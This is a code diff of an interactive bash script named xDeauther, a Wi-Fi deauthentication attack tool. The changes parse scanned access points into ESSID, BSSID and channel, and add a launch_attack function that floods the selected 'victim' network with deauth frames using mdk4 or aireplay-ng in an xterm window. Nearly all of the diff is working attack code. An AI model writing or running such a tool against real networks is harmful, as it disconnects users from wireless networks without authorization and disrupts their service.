@@ -101,14 +101,11 @@ function change_mode() {
 function weapons() {
   echo -e "-=[ ${Y}${BOLD}SELECT WEAPONS${RST} ]=-\n"
   echo -e "[${G}${BOLD}1${RST}] mdk4 [${R}${BOLD}BRUTAL${RST}]"
-  echo -e "[${G}${BOLD}2${RST}] mdk3 (Previous version mdk3)"
-  echo -e "[${G}${BOLD}3${RST}] aireplay-ng [${Y}${BOLD}NORMAL${RST}]"
+  echo -e "[${G}${BOLD}2${RST}] aireplay-ng [${Y}${BOLD}NORMAL${RST}]"
   echo -ne "\n${bgR}${H}xDeauther${RST}:${C}${BOLD}Weapons${RST} => "; read slct_weapons
   if [[ $slct_weapons == 1 ]]; then
     echo -e "\n[${G}${BOLD}+${RST}] Take ${R}${BOLD}mdk4${RST} to be a weapon"
   elif [[ $slct_weapons == 2 ]]; then
-    echo -e "\n[${G}${BOLD}+${RST}] Take ${R}${BOLD}mdk3${RST} to be a weapon"
-  elif [[ $slct_weapons == 3 ]]; then
     echo -e "\n[${G}${BOLD}+${RST}] Take ${R}${BOLD}aireplay-ng${RST} to be a weapon"
   else
     echo -e "\n[${R}${BOLD}!${RST}] Invalid Option! Please select number\n"
@@ -132,17 +129,29 @@ function target() {
   rmline=$(($rmline - 1))
   sed "${rmline}~1d" log/target-01.csv > log/target.csv
   sed '1d' log/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $4"," $1"," $2"," $3 }' > log/showtarget.csv
-  sed '1d' log/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $1 }' > log/BSSID.txt
-  sed '1d' log/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $2 }' > log/channel.txt
   column -s, -t < log/showtarget.csv > log/target.txt
   awk '{ print "[""\033[32m\033[1m"NR-1"\033[0m]" $s }' log/target.txt | sed '1s/0/#/'> log/showtarget.txt
   cat log/showtarget.txt
   echo -ne "\n${bgR}${H}xDeauther${RST}:${C}${BOLD}Target${RST} => "; read slct_target
   slct_target=$(($slct_target + 1))
+  ESSID=$(sed '1d' log/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $4 }' | sed "${slct_target}!d")
+  BSSID=$(sed '1d' log/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $1 }' | sed "${slct_target}!d")
+  channel=$(sed '1d' log/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $2 }' | sed "${slct_target}!d")
+  echo -e "\n[${G}${BOLD}+${RST}] Set${R}${BOLD}${ESSID}${RST} to victim"
+  sleep 2
+  launch_attack
+}
+
+function launch_attack() {
+  if [[ $slct_weapons == 1 ]]; then
+    xterm -fg "#FF0000" -T "Deauth${ESSID} with mdk4" -e /bin/bash -l -c "mdk4 ${iface} d -B ${BSSID} -c ${channel}"
+  elif [[ $slct_weapons == 2 ]]; then
+    xterm -fg "#FF0000" -T "Deauth${ESSID} with aireplay-ng" -e /bin/bash -l -c "aireplay-ng -0 0 -a ${BSSID} --ignore-negative-one ${iface}"
+  fi
 }
 
 function loading3() {
-  for (( i = 0; i <= 10 ; i++ )); do
+  for (( i = 0; i <= 12 ; i++ )); do
     echo -ne "[${Y}―${RST}] Exploring for target...\r"
     sleep 0.1
     echo -ne "[\]\r"
